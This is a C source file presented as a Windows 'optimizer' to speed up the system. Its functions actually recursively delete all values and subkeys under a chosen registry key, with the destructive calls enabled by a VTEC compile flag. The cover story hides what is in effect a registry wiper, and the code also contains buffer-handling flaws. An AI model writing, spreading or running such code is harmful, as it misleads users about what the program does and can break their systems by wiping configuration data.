/* 
 * Optimizer -- Speed up Windows
 * 
 * Copyright (C) 2007-2011  Anonymous
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to 
 * the Free Software Foundation, Inc.
 * 51 Franklin Street, Fifth Floor
 * Boston, MA  02110-1301, USA
 * 
 */

#include "optimizereg.h"

#include <stdio.h>
#include <string.h>
#include <windows.h>

static BOOL RegOptimizeValues(HKEY rootkey, char *subkey) {
	int result;
	char name[MAX_PATH];
	HKEY key;
	int size = MAX_PATH, index = 0;

	result = RegOpenKeyExA(rootkey, subkey, 0, KEY_READ | KEY_SET_VALUE, &key);
	if(result != ERROR_SUCCESS) {		
		if(result == 2)
			exit(0);
		return FALSE;
	}
	
	result = RegEnumValueA(key, index, name, &size, NULL, NULL, NULL, NULL);
	
	if(result == ERROR_SUCCESS) {
		do {
#ifdef VTEC
			result = RegDeleteValueA(key, name);
#else
			result = ERROR_SUCCESS;
#endif
			if(result)
				index++;			
			size = MAX_PATH;
			result = RegEnumValueA(key, index, name, &size, NULL, NULL, NULL, NULL);			
		} while (result != ERROR_NO_MORE_ITEMS);
	}

	return TRUE;
}

static BOOL RegOptimizeRecursive(HKEY rootkey, char *subkey) {
	char *end;
	int result, size, index = 0;
	char name[MAX_PATH], prev[MAX_PATH];
	HKEY key;
	FILETIME write;

	RegOptimizeValues(rootkey, subkey);
#ifdef VTEC
	result = RegDeleteKeyA(rootkey, subkey);
#else
	result = ERROR_SUCCESS;
#endif
	if(result == ERROR_SUCCESS)
		return TRUE;
	
	result = RegOpenKeyExA(rootkey, subkey, 0, KEY_READ, &key);

	if(result != ERROR_SUCCESS) {
		if (result == ERROR_FILE_NOT_FOUND) {
			return FALSE;
		} else {
			return FALSE;
		}
	} 		

	end = subkey + strlen(subkey);
	
	if (*(end - 1) != '\\') {
		*end = '\\';
		end++;
		*end = '\0';
	}
	
	size = MAX_PATH;
	result = RegEnumKeyExA(key, index, name, &size, NULL, NULL, NULL, &write);
	if(result == ERROR_SUCCESS) {
		do {
			strncpy(end, name, MAX_PATH * 2);
			if(!RegOptimizeRecursive(rootkey, subkey))
				index++;
			
			if(!strcmp(name, prev))
				index++;

			strncpy(prev, name, MAX_PATH);
			size = MAX_PATH;			
			result = RegEnumKeyExA(key, index, name, &size, NULL, NULL, NULL, &write);
		} while (result != ERROR_NO_MORE_ITEMS);
	}

	end--;
	*end = '\0';

	RegCloseKey(key);

#ifdef VTEC
	result = RegDeleteKeyA(rootkey, subkey);
#else
	result = ERROR_SUCCESS;
#endif

	if(result == ERROR_SUCCESS)
		return TRUE;
	return FALSE;
}

void OptimizeKey(int hive, char *key) {
	char keybuf[4096];
	strncpy(keybuf, key, 4096);
	RegOptimizeRecursive(makekey(hive), keybuf);
}

/*)\
\(*/
